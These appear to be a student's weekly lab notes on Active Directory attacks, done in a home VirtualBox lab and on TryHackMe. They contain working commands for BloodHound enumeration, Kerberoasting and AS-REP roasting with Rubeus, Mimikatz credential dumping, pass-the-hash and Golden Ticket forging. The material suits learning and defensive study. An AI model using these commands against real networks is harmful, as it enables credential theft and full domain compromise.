# 🛡️ Week 06 - Active Directory Hacking Notes

## 📚 Overview:
This week focuses on understanding **Active Directory (AD)** infrastructure, common attack techniques, and practical exploitation within a controlled lab environment. Techniques include Kerberos ticket attacks, credential dumping, and AD enumeration with BloodHound.

---

## 🎯 Learning Objectives:
- Understand the structure and concepts of Active Directory: Domains, Forests, OUs, GPOs, Users.
- Setup a lab environment with Windows Server (DC) and Windows 10 clients.
- Perform Kerberos ticket attacks (Golden Ticket, Pass-the-Hash).
- Enumerate Active Directory environment using BloodHound.
- Dump credentials using Mimikatz.
- Complete TryHackMe: Attacktive Directory room.

---

## 🛠️ Tools Used:
- **BloodHound**
- **Mimikatz**
- **SharpHound**
- **PowerView**
- **TryHackMe**
- **Windows Server 2019** & **Windows 10 VM**
- **Kali Linux 2024.1**

---

## 🖥️ Lab Setup:
- **1x Windows Server 2019** — Domain Controller (pasindu.local)
- **2x Windows 10 Machines** — Domain-joined (users: `student1`, `admin1`)
- **Kali Linux VM** on same network  
→ VirtualBox Host-Only Network (192.168.100.0/24)

📂 Folder structure:
```
company.local (Domain)
├── IT (OU)
│   ├── User: Pasindu
│   └── User: Kasun
├── Finance (OU)
│   ├── User: Nisansala
│   └── User: Dilani
├── Computers (OU)
│   ├── PC-01
│   └── PC-02
├── GPOs
    ├── Disable USB
    └── Enforce Password Complexity

```

---

## 🔍 Key Commands & Usage:

### 📌 BloodHound Data Collection
```powershell
# Run SharpHound binary
.\SharpHound.exe -c All -v --zipfilename loot.zip
```


### 📌 BloodHound Cypher Queries
```
// Find all Domain Admins
MATCH (u:User)-[:MemberOf]->(g:Group {name:"DOMAIN ADMINS@PASINDU.LOCAL"}) RETURN u

// Find shortest privilege escalation path from student1 to Domain Admins
MATCH p=shortestPath((n:User {name:'student1@PASINDU.LOCAL'})-[*1..]->(m:Group {name:"DOMAIN ADMINS@PASINDU.LOCAL"})) RETURN p
```

### 📌 Kerberoasting (SPN ticket hash extraction)
```powershell
# List accounts with SPN values
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```bash
# Use Rubeus to extract Kerberos TGS tickets
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
```

### 📌 AS-REP Roasting
```powershell
# Find accounts without Kerberos pre-authentication enabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```bash
# Use Rubeus for AS-REP roastable accounts
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

### 📌 Credential Dumping with Mimikatz
```
# Run Mimikatz and enable debug privilege
privilege::debug

# Dump plaintext logon passwords from memory
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM database
lsadump::sam

# Dump Kerberos tickets
sekurlsa::kerberos
```

### 📌 Pass-the-Hash (PtH) Attack
```
# Use NTLM hash for authentication and open a privileged shell
sekurlsa::pth /user:Administrator /domain:pasindu.local /ntlm:<NTLMHASH> /run:cmd.exe
```

### 📌 Golden Ticket Attack
```
# Dump krbtgt NTLM hash
lsadump::lsa /patch

# Create and inject Golden Ticket
kerberos::golden /user:Administrator /domain:pasindu.local /sid:S-1-5-21-XXX /krbtgt:<KRBTGT_HASH> /id:500 /ptt

# Verify injected ticket
klist
```

---

## 📚 References:
  - [Varonis Active Directory Basics](https://www.varonis.com/blog)
  - [BloodHound Documentation](https://bloodhound.readthedocs.io/en/latest/)
  - [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
  - [TryHackMe Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)

---

## 📖 Summary:
- ✅ Understood Active Directory architecture and Kerberos workflow
- ✅ Successfully performed Kerberoasting, AS-REP Roasting, Pass-the-Hash, and Golden Ticket attacks
- ✅ Credential dumped using Mimikatz
- ✅ Enumerated AD graph with BloodHound
- ✅ Completed practical hands-on in TryHackMe
- ✅ Collected logs, screenshots, and evidence for documentation
